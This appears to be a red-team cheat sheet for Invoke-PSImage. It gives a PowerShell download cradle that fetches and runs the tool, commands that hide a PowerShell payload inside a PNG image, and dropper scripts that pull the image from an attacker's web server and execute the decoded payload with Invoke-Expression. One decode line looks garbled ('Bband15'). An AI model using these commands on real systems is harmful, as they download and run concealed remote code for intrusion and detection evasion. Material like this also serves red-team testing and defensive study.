# Scripts

## 01 - Download Cradle

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-PSImage/refs/heads/master/Invoke-PSImage.ps1')

PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/peewpw/Invoke-PSImage/raw/refs/heads/master/Invoke-PSImage.ps1')
```

## 02 - Embed Payload

> [!IMPORTANT] Conditions
> 1. Only PowerShell scripts must be embedded inside the image.
> 2. The image must be larger than the PowerShell script.

It will print out the generated payload to execute on the target.

```
PS C:\> Invoke-PSImage -Script .\payload.ps1 -Out .\payload.png -Image .\image.jpg
```

It will print out the generated payload to execute on the target via web request. Ensure to put the `payload.png` in a webserver.

```
PS C:\> Invoke-PSImage -Script .\payload.ps1 -Out .\payload.png -Image .\image.jpg -WebRequest
```

## 03 - Execute Embedded Image

Executes via dropper.

```powershell
sal a New-Object
Add-Type -A System.Drawing
$g = a System.Drawing.Bitmap ((a System.Net.WebClient).OpenRead("<drive_letter>:\path\to\payload.png"))
$o = a Byte[] 291
(0..0) | ForEach-Object {
	foreach ($x in(0..290)) {
		$p = $g.GetPixel($x, $_)
		$o[$_ * 291 + $x] = ([math]::Floor(($p.Bband15) * 16) -bor ($p.G -band 15))
	}
}
Invoke-Expression([System.Text.Encoding]::ASCII.GetString($o[0..216]))
```

Executes via HTTP request.

```powershell
sal a New-Object
Add-Type -A System.Drawing
$g = a System.Drawing.Bitmap ((a System.Net.WebClient).OpenRead("http[s]://<attacker_IP>[:<PORT>]/payload.png"))
$o = a Byte[] 291
(0..0) | ForEach-Object {
	foreach ($x in(0..290)) {
		$p = $g.GetPixel($x, $_)
		$o[$_ * 291 + $x] = ([math]::Floor(($p.Bband15) * 16) -bor ($p.G -band 15))
	}
}
Invoke-Expression([System.Text.Encoding]::ASCII.GetString($o[0..216]))
```

---
## References

### Source Repositories

- [Invoke-PSImage](https://github.com/peewpw/Invoke-PSImage)

### DMCXBlue

- [DMCXBlue: Steganography](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t0127-obfuscated-files-or-information/steganography)

### Atomic Red Team

- [AtomicRedTeam: Data Obfuscation via Steganography T1001.002](https://www.atomicredteam.io/atomic-red-team/atomics/T1001.002)